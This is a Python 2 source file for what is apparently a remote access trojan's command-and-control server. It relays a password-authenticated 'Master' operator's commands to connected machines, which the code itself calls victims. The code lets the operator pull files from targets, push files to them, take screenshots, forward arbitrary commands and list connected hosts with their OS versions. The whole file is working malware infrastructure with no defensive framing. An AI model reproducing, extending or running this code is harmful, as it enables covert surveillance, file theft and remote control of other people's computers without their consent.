import socket 
from time import sleep
import select
import os
import sys
import getopt
from gc import collect
from math import *
from datetime import datetime

# date = str(datetime.now())[:-16]
# directory = date.split('-')[0]+"/"+date.split('-')[1]+"/"+date.split('-')[-1]+"/"
# if not os.path.exists(directory):
# 	os.makedirs(directory)

os_ver_host = {}

# def logfile(m):
# 	with open(directory+"log.txt","r") as file:
# 		file.readlines()
# 		x = file.tell()
# 	file = open(directory+"log.txt","w")
# 	file.seek(x)
# 	file.write("["+str(datetime.now())[:-7]+"] "+m+"\r\n")

def toint(s):
	l = len(s)
	som = 0
	x = 0
	for i in range(l-1,-1,-1):
		som = som + (ord(s[i])-48)*pow(10,x)
		x = x + 1
	return int(som)

def file_download(client,name,num):
	client.send('OK')
	s = client.recv(1024)
	size = toint(s)
	cou = 0
	client.send('OK-2\0')
	with open("/root/Desktop/tempserver/"+name+str(num),"wb") as f :
		while cou<size-1:
			cou = cou + 1
			data = client.recv(1)
			f.write(data)
	return "/root/Desktop/tempserver/"+name+str(num)

def file_upload(client,path):
	client.send("[+] Ready for Upload!")
	response = client.recv(1024)
	if "OK" in response:
		with open(path,"rb") as f:
			f.readlines()	
			sz = f.tell()
		client.send(str(sz))
		response = client.recv(1024)
		cou = 0
		with open(path,"rb") as f:
			while 1:
				cou+=1
				buff = f.read(1)
				if cou == sz:
					break
				client.send(buff)
		print "[+] Upload finished!"
		

class Server():
	def __init__(self, host,port):
		self.host = host
		self.port = port
		try:
			self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			m = "[+] The Server has been successfully built."
			# logfile(m)
			print m
		except:
			m = "[-] The Server couldn't be build."
			# logfile(m)
			print m
	def start(self):
		try:
			self.socket.bind((self.host,self.port))
			self.socket.listen(5)
			m = "[+] The Server has been successfully started and is listening on port : "+str(self.port)+"."
			# logfile(m)
			print m
		except:
			m = "[-] The Server couldn't be started."
			# logfile(m)
			print m
	def run(self):
		m = "[+] The Server is running ..."
		# logfile(m)
		print m
		master = 0
		opens  = []
		pseudo = {}
		c = 0
		while 1:
			rlist,wlist,xlist = select.select([self.socket]+opens,[],[])
			for client in rlist:
				if client is self.socket:
					# try:
					new_client,addr = self.socket.accept()
					m = "[+]  Connected successfully to the new client."
					# logfile(m)
					print m
					opens.append(new_client)
					new_client.send("<SERVER>: Please give us your pseudo.\n")
					nick = new_client.recv(1024)
					pseudo[new_client] = nick
					if nick == "Admin":
						new_client.send("<SERVER>: Welcome Master, confirm your id.\n\x00")
						password = new_client.recv(1024)
						if password == "fucksociety":
								master = new_client
								os_ver_host[nick] = "MASTER"
					else:
						os_ver = new_client.recv(1024)
						os_ver_host[nick] = os_ver
					# print nick
					new_client.send("<SERVER>: Welcome to our server.\n")
					# except:
						# print "[-] Except : Failed to connect to the new client."
				else:
					msg = ""
					while 1:
						buff = client.recv(1024)
						if len(buff) < 1024:
							msg += buff
							break
						msg += buff
					try:
						if msg == "" :
							opens.remove(client)
							m = "[-] "+pseudo[client]+" disconnected."
							# logfile(m)
							print m
							del pseudo[client]
						else:
							print msg
							# logfile(msg)
							if 'GET' in msg:
								c += 1
								target = msg.split('*$:')[0].split(' ')[-1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(msg+'\0')
								ack = target_sock.recv(1024)
								if 'Ready' in ack:
									m = "[+] Downloading from target !"
									# logfile(m)
									print m
									path = file_download(target_sock,pseudo[client],c)
									m = "[+] Uploading to Master"
									# logfile(m)
									print m
									file_upload(master,path)
							elif 'CLOSE' in msg:
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send('FUCK YOU')
								master.send("<SERVER> : "+pseudo[target_sock]+" was disconnected.\n")
								opens.remove(target_sock)
								print "[-] "+pseudo[target_sock]+" disconnected."
								del pseudo[client]
							elif 'UP' in msg:
								c += 1
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(msg)
								ack = master.recv(1024)
								if 'Ready' in ack:
									path = file_download(master,pseudo[master],c)
									master.send('Done!')
									file_upload(target_sock,path)
							elif 'Who is up' in msg:
								master.send(str(os_ver_host).replace('{','[').replace('}',']')+"\r\n")
							elif 'cd' in msg:
								master.send('Ok\r\n')
							elif 'chmod' in msg:
								master.send('Ok\r\n')
							elif 'Screenshot' in msg:
								target = msg.split('*$:')[1]
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(msg)
								ack = target_sock.recv(1024)
								if 'Ready' in ack:
									path = file_download(target_sock,pseudo[client],c)
									file_upload(master,path)
							elif 'TAKE' in msg:
								target = msg.split('*$:')[1]
								print 'Yes'
								for i,j in pseudo.iteritems():
									if j == target:
										target_sock = i
								target_sock.send(msg)
								print 'Forward message to victim'
								ack = target_sock.recv(1024)
								if 'Ready' in ack:
									print 'Ready to download.'
									path = file_download(target_sock,pseudo[client],c)
									file_upload(master,path)
							else:
								if client is not master:
									master.send(msg+"\r\n")
								else:
									target = msg.split('*$:')[0]
									for i,j in pseudo.iteritems():
										if j == target:
											target_sock = i
									target_sock.send(msg.split('*$:')[1])
					except:
						print "[-] Something went wrong !"
			collect()

def main():
	if not len(sys.argv[1:]):
		sys.exit(0)	
	try:
		opts,args = getopt.getopt(sys.argv[1:],"h:p:",["host","port"])
	except :
		sys.exit(0)

	for o,a in opts:
		if o in ("-p","--port")  :
			port = int(a)
		elif o in ("-h","--host")  :
			host = a
		else :
			sys.exit(0)
	ser = Server(host,port)
	ser.start()
	ser.run()

if __name__ == '__main__':
	main()